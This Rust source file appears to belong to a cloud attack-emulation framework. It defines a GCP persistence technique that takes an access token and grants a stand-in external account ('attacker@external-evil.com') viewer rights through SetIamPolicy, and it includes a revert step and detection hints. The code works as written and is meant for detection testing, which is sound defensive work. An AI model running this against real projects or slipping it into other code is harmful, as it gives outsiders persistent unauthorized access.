use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

const ATTACKER_EMAIL: &str = "user:attacker@external-evil.com";

async fn gcp_token() -> Result<String> {
    if let Ok(token) = std::env::var("GOOGLE_ACCESS_TOKEN") {
        return Ok(token);
    }
    let output = tokio::process::Command::new("gcloud")
        .args(["auth", "print-access-token"])
        .output()
        .await?;
    let token = String::from_utf8(output.stdout)?.trim().to_string();
    if token.is_empty() {
        anyhow::bail!("Could not obtain GCP access token via gcloud CLI");
    }
    Ok(token)
}

async fn gcp_project() -> Result<String> {
    std::env::var("GOOGLE_PROJECT_ID")
        .map_err(|_| anyhow::anyhow!("GOOGLE_PROJECT_ID not set"))
}

async fn detonate_impl(
    _outputs: HashMap<String, String>,
    _providers: Arc<CloudProviders>,
) -> Result<()> {
    let token = gcp_token().await?;
    let project = gcp_project().await?;
    let http = reqwest::Client::new();

    // Get current project IAM policy
    let get_url = format!(
        "https://cloudresourcemanager.googleapis.com/v1/projects/{}:getIamPolicy",
        project
    );
    let mut policy: serde_json::Value = http
        .post(&get_url)
        .bearer_auth(&token)
        .json(&serde_json::json!({}))
        .send()
        .await?
        .json()
        .await?;

    // Add attacker as project viewer
    let bindings = policy["bindings"].as_array_mut()
        .ok_or_else(|| anyhow::anyhow!("No bindings in IAM policy"))?;

    let viewer_role = "roles/viewer";
    let mut found = false;
    for binding in bindings.iter_mut() {
        if binding["role"].as_str() == Some(viewer_role) {
            if let Some(members) = binding["members"].as_array_mut() {
                members.push(serde_json::json!(ATTACKER_EMAIL));
            }
            found = true;
            break;
        }
    }
    if !found {
        let new_binding = serde_json::json!({
            "role": viewer_role,
            "members": [ATTACKER_EMAIL]
        });
        bindings.push(new_binding);
    }

    // Set updated policy
    let set_url = format!(
        "https://cloudresourcemanager.googleapis.com/v1/projects/{}:setIamPolicy",
        project
    );
    let body = serde_json::json!({ "policy": policy });
    let resp = http
        .post(&set_url)
        .bearer_auth(&token)
        .json(&body)
        .send()
        .await?;

    if resp.status().is_success() {
        println!(
            "Added external user '{}' as project viewer on project '{}' — attacker has persistent read access",
            ATTACKER_EMAIL, project
        );
    } else {
        let status = resp.status();
        let text = resp.text().await.unwrap_or_default();
        anyhow::bail!("Failed to add external user IAM binding ({}): {}", status, text);
    }

    Ok(())
}

fn detonate(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

async fn revert_impl(
    _outputs: HashMap<String, String>,
    _providers: Arc<CloudProviders>,
) -> Result<()> {
    let token = gcp_token().await?;
    let project = gcp_project().await?;
    let http = reqwest::Client::new();

    let get_url = format!(
        "https://cloudresourcemanager.googleapis.com/v1/projects/{}:getIamPolicy",
        project
    );
    let mut policy: serde_json::Value = http
        .post(&get_url)
        .bearer_auth(&token)
        .json(&serde_json::json!({}))
        .send()
        .await?
        .json()
        .await?;

    // Remove attacker from all roles
    if let Some(bindings) = policy["bindings"].as_array_mut() {
        for binding in bindings.iter_mut() {
            if let Some(members) = binding["members"].as_array_mut() {
                members.retain(|m| m.as_str() != Some(ATTACKER_EMAIL));
            }
        }
        // Remove bindings with empty member lists
        bindings.retain(|b| {
            b["members"]
                .as_array()
                .map(|m| !m.is_empty())
                .unwrap_or(false)
        });
    }

    let set_url = format!(
        "https://cloudresourcemanager.googleapis.com/v1/projects/{}:setIamPolicy",
        project
    );
    let body = serde_json::json!({ "policy": policy });
    let resp = http
        .post(&set_url)
        .bearer_auth(&token)
        .json(&body)
        .send()
        .await?;

    if resp.status().is_success() {
        println!("Removed external user '{}' from project '{}'", ATTACKER_EMAIL, project);
    } else {
        let status = resp.status();
        let text = resp.text().await.unwrap_or_default();
        anyhow::bail!("Failed to remove external user IAM binding ({}): {}", status, text);
    }

    Ok(())
}

fn revert(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(revert_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "gcp.persistence.invite-external-user",
        friendly_name: "Invite External User as GCP Project Viewer",
        description: "Adds an external Google account as a project viewer via IAM, establishing persistent read access to GCP project resources for an attacker-controlled account.",
        detection: "GCP Audit Log: SetIamPolicy with external user binding. Cloud Security Command Center: Abnormal grant to external entity.",
        platform: Platform::Gcp,
        mitre_tactics: &[MitreTactic::Persistence],
        is_idempotent: true,
        is_slow: false,
        prerequisite_tf: None,
        detonate,
        revert: Some(revert),
    }
}
